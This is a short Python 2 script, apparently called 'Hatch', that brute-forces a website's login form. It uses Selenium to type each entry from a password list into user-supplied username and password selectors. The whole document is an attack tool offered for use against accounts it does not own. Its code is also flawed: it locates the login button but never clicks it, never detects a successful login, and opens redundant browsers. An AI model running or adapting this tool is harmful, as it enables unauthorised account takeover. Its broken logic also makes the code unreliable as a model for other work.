# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--

#ERRORS ???? try these !!
# pip install pyvirtualdisplay selenium
# sudo apt-get install xvfb

import datetime
from selenium import webdriver
from sys import stdout
import sys
import time as t
import requests
now = datetime.datetime.now()
from selenium.common.exceptions import NoSuchElementException
from pyvirtualdisplay import Display

display = Display(visible=1, size=(800, 800))  
display.start()
driver = webdriver.Chrome()
options = webdriver.ChromeOptions()
options.add_argument("--disable-popup-blocking")
options.add_argument("--disable-extensions")
count = 1 #count
driver.get('https://www.google.com')

#Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'


banner = color.BOLD + color.RED +'''  
  _    _       _       _     
 | |  | |     | |     | |    
 | |__| | __ _| |_ ___| |__  
 |  __  |/ _` | __/ __| '_ \ 
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|                                                                                                                                        
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

def main():
    print (banner)
    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()
    username_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ') 
    password_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    f = open(pass_list, 'r')
    driver = webdriver.Chrome()
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(chrome_options=options)
    browser.get(website)
    while True:
        try:
            for line in f:
                browser.get(website)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print '------------------------'
                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                print '------------------------'
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()

main()